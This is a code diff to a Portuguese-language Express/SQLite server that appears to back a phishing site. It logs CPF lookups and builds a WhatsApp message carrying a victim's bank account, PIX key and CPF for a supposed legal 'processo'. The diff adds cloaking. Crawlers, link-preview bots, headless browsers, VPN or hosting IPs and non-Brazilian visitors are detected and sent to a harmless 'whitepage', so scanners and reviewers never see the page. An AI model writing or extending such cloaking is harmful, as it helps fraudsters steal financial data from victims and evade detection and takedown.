@@ -24,9 +24,19 @@ db.exec(`
     navegador TEXT,
     pais TEXT,
     cidade TEXT,
+    bloqueado INTEGER DEFAULT 0,
+    motivo_bloqueio TEXT DEFAULT '',
+    is_vpn INTEGER DEFAULT 0,
+    is_bot INTEGER DEFAULT 0,
     criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
   )
 `);
+
+// Adicionar colunas se não existirem
+try { db.exec("ALTER TABLE acessos ADD COLUMN bloqueado INTEGER DEFAULT 0"); } catch {}
+try { db.exec("ALTER TABLE acessos ADD COLUMN motivo_bloqueio TEXT DEFAULT ''"); } catch {}
+try { db.exec("ALTER TABLE acessos ADD COLUMN is_vpn INTEGER DEFAULT 0"); } catch {}
+try { db.exec("ALTER TABLE acessos ADD COLUMN is_bot INTEGER DEFAULT 0"); } catch {}
 
 // Tabela de configurações
 db.exec(`
@@ -39,7 +49,12 @@ db.exec(`
 // Inserir configurações padrão se não existirem
 const defaultConfigs = [
   ['whatsapp_numero', '5511999999999'],
-  ['whatsapp_mensagem', 'Olá, me chamo {nome} e estou entrando em contato referente ao processo {processo}.\n\nMeus dados bancários:\n*Banco:* {banco}\n*Agência:* {agencia}\n*Conta:* {conta} ({tipo_conta})\n*Titular:* {titular}\n*CPF Titular:* {cpf_titular}\n*PIX:* {pix}']
+  ['whatsapp_mensagem', 'Olá, me chamo {nome} e estou entrando em contato referente ao processo {processo}.\n\nMeus dados bancários:\n*Banco:* {banco}\n*Agência:* {agencia}\n*Conta:* {conta} ({tipo_conta})\n*Titular:* {titular}\n*CPF Titular:* {cpf_titular}\n*PIX:* {pix}'],
+  ['protecao_ativa', 'true'],
+  ['bloquear_vpn', 'true'],
+  ['bloquear_fora_brasil', 'true'],
+  ['bloquear_bots', 'true'],
+  ['whitepage_url', 'https://google.com']
 ];
 for (const [chave, valor] of defaultConfigs) {
   db.prepare('INSERT OR IGNORE INTO configuracoes (chave, valor) VALUES (?, ?)').run(chave, valor);
@@ -307,17 +322,107 @@ app.delete('/api/prosseguimentos/:id', (req, res) => {
   res.json({ success: true });
 });
 
+// Lista de bots conhecidos
+const BOT_PATTERNS = [
+  /bot/i, /crawler/i, /spider/i, /crawling/i, /feedfetcher/i,
+  /slurp/i, /mediapartners/i, /googlebot/i, /bingbot/i, /yandex/i,
+  /baiduspider/i, /facebookexternalhit/i, /twitterbot/i, /rogerbot/i,
+  /linkedinbot/i, /embedly/i, /quora/i, /pinterest/i, /slackbot/i,
+  /vkShare/i, /W3C_Validator/i, /redditbot/i, /applebot/i, /whatsapp/i,
+  /flipboard/i, /tumblr/i, /bitlybot/i, /skypeuripreview/i, /nuzzel/i,
+  /discordbot/i, /qwantify/i, /pinterestbot/i, /bitrix/i, /xing-contenttabreceiver/i,
+  /chrome-lighthouse/i, /telegrambot/i, /integration/i, /phantomjs/i,
+  /headless/i, /selenium/i, /webdriver/i, /puppet/i
+];
+
+function isBot(userAgent) {
+  if (!userAgent) return true;
+  return BOT_PATTERNS.some(pattern => pattern.test(userAgent));
+}
+
+// Verificar proteção (chamado pelo frontend)
+app.post('/api/verificar-acesso', async (req, res) => {
+  const userAgent = req.headers['user-agent'] || '';
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
+
+  // Buscar configurações
+  const configs = {};
+  db.prepare('SELECT * FROM configuracoes').all().forEach(c => configs[c.chave] = c.valor);
+
+  const protecaoAtiva = configs.protecao_ativa === 'true';
+  const bloquearVpn = configs.bloquear_vpn === 'true';
+  const bloquearForaBrasil = configs.bloquear_fora_brasil === 'true';
+  const bloquearBots = configs.bloquear_bots === 'true';
+  const whitepageUrl = configs.whitepage_url || 'https://google.com';
+
+  // Se proteção desativada, permitir
+  if (!protecaoAtiva) {
+    return res.json({ allowed: true });
+  }
+
+  // Verificar bot
+  const ehBot = isBot(userAgent);
+  if (bloquearBots && ehBot) {
+    return res.json({ allowed: false, reason: 'bot', redirect: whitepageUrl });
+  }
+
+  // Verificar IP (VPN e país) usando ip-api.com
+  let ipInfo = { country: 'BR', proxy: false, hosting: false };
+  try {
+    const cleanIp = ip.replace('::ffff:', '');
+    if (cleanIp && cleanIp !== '127.0.0.1' && cleanIp !== 'localhost') {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 3000);
+      const apiRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,city,proxy,hosting`, {
+        signal: controller.signal
+      });
+      clearTimeout(timeout);
+      if (apiRes.ok) {
+        const data = await apiRes.json();
+        if (data.status === 'success') {
+          ipInfo = data;
+        }
+      }
+    }
+  } catch (err) {
+    console.log('Erro ao verificar IP:', err.message);
+  }
+
+  // Verificar VPN/Proxy
+  if (bloquearVpn && (ipInfo.proxy || ipInfo.hosting)) {
+    return res.json({ allowed: false, reason: 'vpn', redirect: whitepageUrl, ipInfo });
+  }
+
+  // Verificar país
+  if (bloquearForaBrasil && ipInfo.countryCode && ipInfo.countryCode !== 'BR') {
+    return res.json({ allowed: false, reason: 'pais', redirect: whitepageUrl, ipInfo });
+  }
+
+  return res.json({ allowed: true, ipInfo });
+});
+
 // Registrar acesso
-app.post('/api/acesso', (req, res) => {
-  const { cpf_consultado, dispositivo, navegador } = req.body;
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Desconhecido';
+app.post('/api/acesso', async (req, res) => {
+  const { cpf_consultado, dispositivo, navegador, bloqueado, motivo_bloqueio, is_vpn, is_bot, pais, cidade } = req.body;
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'Desconhecido';
 
   const stmt = db.prepare(`
-    INSERT INTO acessos (ip, cpf_consultado, dispositivo, navegador, pais, cidade)
-    VALUES (?, ?, ?, ?, ?, ?)
+    INSERT INTO acessos (ip, cpf_consultado, dispositivo, navegador, pais, cidade, bloqueado, motivo_bloqueio, is_vpn, is_bot)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
   `);
 
-  stmt.run(ip, cpf_consultado || '', dispositivo || 'Desconhecido', navegador || 'Desconhecido', 'Brasil', '');
+  stmt.run(
+    ip,
+    cpf_consultado || '',
+    dispositivo || 'Desconhecido',
+    navegador || 'Desconhecido',
+    pais || 'Brasil',
+    cidade || '',
+    bloqueado ? 1 : 0,
+    motivo_bloqueio || '',
+    is_vpn ? 1 : 0,
+    is_bot ? 1 : 0
+  );
   res.json({ success: true });
 });
 
@@ -345,9 +450,10 @@ app.get('/api/acessos', (req, res) => {
 app.get('/api/acessos/stats', (req, res) => {
   const total = db.prepare('SELECT COUNT(*) as total FROM acessos').get().total;
   const hoje = db.prepare("SELECT COUNT(*) as total FROM acessos WHERE DATE(criado_em) = DATE('now')").get().total;
+  const bloqueados = db.prepare("SELECT COUNT(*) as total FROM acessos WHERE bloqueado = 1").get().total;
   const dispositivos = db.prepare('SELECT dispositivo, COUNT(*) as count FROM acessos GROUP BY dispositivo ORDER BY count DESC LIMIT 5').all();
 
-  res.json({ total, hoje, dispositivos });
+  res.json({ total, hoje, bloqueados, dispositivos });
 });
 
 // Obter configurações
@@ -362,11 +468,24 @@ app.get('/api/configuracoes', (req, res) => {
 
 // Salvar configurações
 app.put('/api/configuracoes', (req, res) => {
-  const { whatsapp_numero, whatsapp_mensagem } = req.body;
+  const {
+    whatsapp_numero,
+    whatsapp_mensagem,
+    protecao_ativa,
+    bloquear_vpn,
+    bloquear_fora_brasil,
+    bloquear_bots,
+    whitepage_url
+  } = req.body;
 
   const stmt = db.prepare('INSERT OR REPLACE INTO configuracoes (chave, valor) VALUES (?, ?)');
   if (whatsapp_numero !== undefined) stmt.run('whatsapp_numero', whatsapp_numero);
   if (whatsapp_mensagem !== undefined) stmt.run('whatsapp_mensagem', whatsapp_mensagem);
+  if (protecao_ativa !== undefined) stmt.run('protecao_ativa', protecao_ativa);
+  if (bloquear_vpn !== undefined) stmt.run('bloquear_vpn', bloquear_vpn);
+  if (bloquear_fora_brasil !== undefined) stmt.run('bloquear_fora_brasil', bloquear_fora_brasil);
+  if (bloquear_bots !== undefined) stmt.run('bloquear_bots', bloquear_bots);
+  if (whitepage_url !== undefined) stmt.run('whitepage_url', whitepage_url);
 
   res.json({ success: true });
 });
